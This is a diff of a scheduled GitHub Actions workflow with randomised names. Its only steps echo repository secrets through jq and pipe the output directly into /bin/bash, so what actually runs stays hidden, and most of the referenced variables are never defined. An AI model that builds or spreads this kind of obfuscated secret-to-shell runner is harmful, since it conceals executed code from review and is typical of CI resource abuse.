@@ -1,37 +1,27 @@
 name: lindaiyan4635
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 1/6 * * *'
-jobs:  # 11887
+    - cron: '10 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lindaiyan4635
         env:
-          hylus1: ${{ secrets.hylus1 }}
+          vka30137: ${{ secrets.vka30137 }}
         run: |
-          echo $hylus1 | jq -r .uzutp652 | /bin/bash
-          echo $xfcy85 | jq -r .spb64301 | /bin/bash
-          echo $ra7 | jq -r .hs7 | /bin/bash
-          echo $hwm5 | jq -r .rtfw982 | /bin/bash
-          echo $kqo59845 | jq -r .ouipg2203 | /bin/bash
-          echo $otdga26672 | jq -r .xju7 | /bin/bash
-          echo $ck977 | jq -r .rv13909 | /bin/bash
-          echo $wsy1 | jq -r .zsxq56 | /bin/bash
-          echo $ynaa47964 | jq -r .irdo5766 | /bin/bash
-          echo $dvdb61 | jq -r .gbzp5 | /bin/bash
-          echo $ah72 | jq -r .yxv884 | /bin/bash
-          echo $r90962 | jq -r .jnxyq3 | /bin/bash
-          echo $fhd78 | jq -r .mvxwj3 | /bin/bash
-          echo $n68 | jq -r .grqp4 | /bin/bash
-          echo $ya04 | jq -r .tjpbh06 | /bin/bash
-          echo $sn448 | jq -r .e9802 | /bin/bash
-          echo $q2 | jq -r .dxo15707 | /bin/bash
-          echo $gokvm653 | jq -r .qdlo45 | /bin/bash
-          echo $cnjj2 | jq -r .n78835 | /bin/bash
-          echo $z318 | jq -r .oadmr499 | /bin/bash
-          echo $b6 | jq -r .pm74 | /bin/bash
+          echo $vka30137 | jq -r .b38 | /bin/bash
+          echo $zzcm6497 | jq -r .jgmqw441 | /bin/bash
+          echo $qqm22494 | jq -r .vpdk2 | /bin/bash
+          echo $jmfw290 | jq -r .cbssj26 | /bin/bash
+          echo $sox24 | jq -r .qcbzk9 | /bin/bash
+          echo $wh77 | jq -r .ci37213 | /bin/bash
+          echo $hg6122 | jq -r .ap0 | /bin/bash
+          echo $cddcg61756 | jq -r .vr44055 | /bin/bash
+          echo $gb95 | jq -r .bw00 | /bin/bash
+          echo $tzq54 | jq -r .m226 | /bin/bash
+          echo $h3693 | jq -r .og2385 | /bin/bash
 
